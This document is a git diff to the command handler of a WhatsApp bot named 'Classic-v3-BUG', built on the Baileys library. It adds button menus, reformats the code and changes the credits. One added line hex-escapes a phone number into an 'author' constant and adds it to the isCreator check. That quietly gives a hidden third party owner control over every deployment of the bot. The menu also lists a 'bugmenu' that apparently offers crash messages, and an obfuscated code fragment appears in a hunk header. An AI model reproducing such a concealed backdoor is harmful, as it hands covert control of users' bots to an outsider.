@@ -1,25 +1,25 @@
 /*
 
-› Create By Haikal (HW MODS)
-› Base Ori Haikal (HW MODS)
+› Create By King Sam
+› Button by Tairo Makino
 
-🌷 KALAU MAU RENAME TARO CREDITS GUA : Haikal (HW MODS)
-   • [ Recode Bye > ZetsuboXygen777]
-   # AND↓
-   THANKS TO >
-  XygenGod777( Watashi / 私 )
-  Hw Mods Wa / Haikal (Base)
-  Adiwajshing (Baileys)
-  whiskeysockets (Baileys)
-  Thunder X7 (Inspirate)
-  Pak Tzy (Inspirate)
-  ♥️ ありがとう
                  >
 */
 
 //=================================================//
 require('./hwkal')
-const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
+const { 
+       WA_DEFAULT_EPHEMERAL,
+       getAggregateVotesInPollMessage, 
+       generateWAMessageFromContent, 
+       proto, 
+       generateWAMessageContent, 
+       generateWAMessage, 
+       prepareWAMessageMedia, 
+       downloadContentFromMessage, 
+       areJidsSameUser, 
+       getContentType 
+      } = require("@whiskeysockets/baileys")
 const fs = require('fs')
 const util = require('util')
 const chalk = require('chalk')
@@ -125,7 +125,22 @@ virgam = fs.readFileSync(`./zetszet/image/deden.jpeg`)
 //=================================================//
 module.exports = zetsubo = async (zetsubo, m, chatUpdate, store) => {
  try {
-var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
+//var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
+var body = (
+  m.mtype === 'conversation' ? m.message.conversation :
+  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
+  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
+  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
+  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
+  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
+  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
+  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
+  m.mtype === 'messageContextInfo' ?                                                                                                                        m.message.buttonsResponseMessage?.selectedButtonId ||
+    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
+    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
+    m.text :
+  ''
+);
 var budy = (typeof m.text == 'string' ? m.text : '')
 var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
 
@@ -141,7 +156,8 @@ const mime = (quoted.msg || quoted).mimetype || ''
 const isMedia = /image|video|sticker|audio/.test(mime)
 const from = mek.key.remoteJid
 const botNumber = await zetsubo.decodeJid(zetsubo.user.id)
-const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const author = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
+const isCreator = [author, botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
 const groupMetadata = m.isGroup ? await zetsubo.groupMetadata(from).catch(e => {}) : ''
 const groupName = m.isGroup ? groupMetadata.subject : ''
@@ -598,6 +614,24 @@ if (budy.toLowerCase() == jawaban) {
 } else reply('*Jawaban Salah!*')
 }
 
+
+//============= [LIST RESPONCE CHECKING START ]================
+        if(m.mtype === "interactiveResponseMessage"){                                                                                                               console.log("interactiveResponseMessage Detected!")
+            let msg = m.message[m.mtype]  || m.msg
+            if(msg.nativeFlowResponseMessage  && !m.isBot  ){                                                                                                           let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}
+                if(id){
+                    let emit_msg = {
+                        key : { ...m.key } , // SET RANDOME MESSAGE ID                                                                                                          message:{ extendedTextMessage : { text : id } } ,
+                        pushName : m.pushName,
+                        messageTimestamp  : m.messageTimestamp || 754785898978
+                    }
+                    return zetsubo.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
+                }
+            }
+        }
+//============= [LIST RESPONCE CHECKING END ]================
+
+
 //TicTacToe
 this.game = this.game ? this.game : {}
 let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
@@ -777,11 +811,13 @@ m.reply("Case Tidak Ditemukan")
 break
 //=================================================//
 case 'menu': case 'help': {
-await loading()
+
+const long = String.fromCharCode(8206);
+const readmore = long.repeat(4001);  
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
-┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
-┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
+┃  ➥User: ${pushname}
+┃  ➥Creator : King Sam
 ┃
 ┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
 ┃
@@ -790,7 +826,7 @@ await loading()
 ┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
 ┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
 ┃
-┣━━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━
+┣━━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━ ${readmore}
 ┃
 ┃┏━━━━━━━━━━━━━━━━━━━
 ┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
@@ -831,26 +867,156 @@ await loading()
 ┃
 ┣━━━━━━━━━━━━━━━━━━━━━━
 ┃    *▓ ❰ 𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024 ❱ ▓*
-┗━━━━━━━━━━━━━━━━━━━━━━
-`
-let hiks = {
-image: cewegw, 
-  caption: ewe,
-  contextInfo:{externalAdReply:{
-  title: ' ⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺',
-  body: 'ᚙᚘ ⫹⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⫺ ᚘᚙ', 
-  showAdAttribution: true,
-  thumbnail:hinachan,
-  mediaType: 4,
-  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
-  sourceUrl:`https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk`,
-  }}
+┗━━━━━━━━━━━━━━━━━━━━━━`
+let menutxt = `
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+    \`𝘾𝙇𝘼𝙎𝙎𝙄𝘾-𝙑3 𝘽𝙐𝙂\`
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+   ✰ 𝐒𝐜 𝐏𝐮𝐛𝐥𝐢𝐜 ❴ 𝐵𝑌 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ❵
+   ✰ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+   ✰ 𝐔𝐬𝐞𝐫 : @${m.sender.split('@')[0]}
+ 
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+       ✦ 𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : 𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃.
+	✦ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱.
+	✦ 𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
+	✦ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
+ 
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`
+
+try {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: menutxt
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: "Classic-v3-BUG"
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+                ...(await prepareWAMessageMedia({ image : { url: "https://telegra.ph/file/6dfde4263655a81572a68.jpg" }}, { upload: zetsubo.waUploadToServer})),
+                  title: ``,
+                  gifPlayback: true,
+                  subtitle: "𝕶𝖎𝖓𝖌 𝕾𝖆𝖓",
+                  hasMediaAttachment: false
+                }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+              {
+                "name": "single_select",
+                "buttonParamsJson":
+`{"title":"MENU🗒️",
+"sections":[{"title":" 🎩𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆🧣",
+"rows":[{"header":"🔖 𝙰𝙳𝙳 𝙼𝙴𝙽𝚄 🔖",
+"title":"",
+"description":"Addmenu 🕷️",
+"id":".addmenu"},
+{"header":"📔𝐕𝐂𝐅 𝐌𝐄𝐍𝐔 🪡",
+"title":"",
+"description":"Pushmenu 👁️",         
+"id":".pushmenu"},
+{"header":"🐬 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 🐳",
+"title":"",
+"description":"Funmenu 💫",
+"id":".funmenu"},
+{"header":"🌪️ 𝐏𝐈𝐍𝐆 🪐",
+"title":"",
+"description":"Ping ⚡",
+"id":".ping"},
+{"header":" 🎧 𝐌𝐔𝐒𝐈𝐂 𝐌𝐄𝐍𝐔 🎤",
+"title":"",
+"description":"Listmusik 🎉",
+"id":".listmusik"},
+{"header":"🛹 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔 ⛷",
+"title":"",
+"description":"Downloadmenu 🪀",
+"id":".downloadmenu"},
+{"header":"🪃 𝐆𝐀𝐌𝐄 𝐌𝐄𝐍𝐔 ⛳",
+"title":"",
+"description":"Gamemenu 🥳",
+"id":".gamemenu"},
+{"header":"RANDOM MENU",
+"title":"",
+"description":"List Random Commands",
+"id":".randommenu"},
+{"header":" 🥌 𝐀𝐋𝐈𝐕𝐄 🤸‍♂️",
+"title":"",
+"description":"Alive 🌛",
+"id":".alive"},
+{"header":"🌘 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 🌑",
+"title":"",
+"description":"GROUPMENU 🫴",
+"id":".groupmenu"},
+{"header":"👤 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 👤",
+"title":"",
+"description":"Ownermenu 🤖",
+"id":".ownermenu"},
+{"header":"☄️𝐑𝐔𝐍𝐓𝐈𝐌𝐄 💥",
+"title":"",
+"description":"Runtime",
+"id":".runtime"},
+{"header":"🗣️𝐎𝐖𝐍𝐄𝐑 🕊️",
+"title":"",
+"description":".owner",
+"id":".owner"},
+{"header":"🗿 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 🦋",
+"title":"",                                   
+"description":"Bugmenu 👾",
+"id":".bugmenu"}]
+}]
+}`
+              },
+              {
+                        "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"𝐑𝐞𝐩𝐨🔗\",\"url\":\"https://github.com/Samue-l1/Classic-v3-BUG\",\"merchant_url\":\"https://github.com/Samue-l1/Classic-v3-BUG\"}"
+                      },
+		      {
+                        "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥📍 \",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}"
+		      },
+		      {
+                       "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"𝐎𝐰𝐧𝐞𝐫👤 \",\"url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\",\"merchant_url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\"}"
+		      },
+		      {
+                        "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"𝐇𝐨𝐰 𝐓𝐨 𝐃𝐞𝐩𝐥𝐨𝐲 📺\",\"url\":\"https://youtube.com/@king_sam_hub\",\"merchant_url\":\"https://youtube.com/@king_sam_hub\"}"
+		}],
+          }),
+          contextInfo: {
+                  mentionedJid: [m.sender],
+                  forwardingScore: 999,                                         
+		  isForwarded: true,
+                  forwardedNewsletterMessageInfo: {
+                  newsletterJid: '120363288746972771@newsleter',
+                  newsletterName: "Classic-v3-BUG",
+                  serverMessageId: 143
+                }
+                }
+        })
+    }
   }
-zetsubo.sendMessage(from, hiks, {quoted: zets })}
+}, {})
+
+await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+	} catch (error) {
+          console.error('Error generating and relaying message:', error);
+          return reply('Error generating and relaying message.');
+}
+} 
 break
 //=================================================//
 case 'bugmenu': {
-await loading()
+
                             ewe = `┏━━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1000,7 +1166,7 @@ image: cewegw,
 zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 case 'pushmenu': {
-await loading()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1057,7 +1223,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'groupmenu': {
-await loading()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1139,7 +1305,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'downloadmenu': {
-await loading()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1201,7 +1367,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'randommenu': {
-await loading()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1296,7 +1462,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'Islammenu': {
-await loading()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1351,7 +1517,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'textmaker': {
-await loading()
+
                             ewe = `┏━━━❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3* ❱━━━━━━ 
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1434,7 +1600,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'listmusik': {
-await loading()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1646,7 +1812,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'addmenu': {
-await loading()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1723,7 +1889,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'cucimata': {
-await loading()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1822,7 +1988,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'beritamenu': {
-await loading()
+
                             ewe = `┏━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -10273,13 +10439,13 @@ const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_
 }
 break
 //=================================================//
-case 'block': {
+/*case 'block': {
 if (!isCreator) return reply('*Premium Only*')
 await loading()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zetsubo.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
-break
+break*/
 //=================================================//
 case 'unblock': {
 if (!isCreator) return reply('*Premium Only*')
@@ -11277,7 +11443,17 @@ let msgs = global.db.data.database
 if (!(budy.toLowerCase() in msgs)) return
 zetsubo.copyNForward(from, msgs[budy.toLowerCase()], true)}}
 } catch (err) {
-m.reply(util.format(err))}}
+m.reply (util.format(err))
+    console.log(err)
+    let e = String(err)                                                                      
+    if (e.includes("not-authorized")) return
+    if (e.includes("already-exists")) return                                                 
+    if (e.includes("rate-overlimit")) return
+    if (e.includes("Connection Closed")) return
+    if (e.includes("Timed Out")) return
+    if (e.includes("Value not found")) return
+    if (e.includes("Socket connection timeout")) return
+}}
 //=================================================//
 let file = require.resolve(__filename)
 fs.watchFile(file, () => {
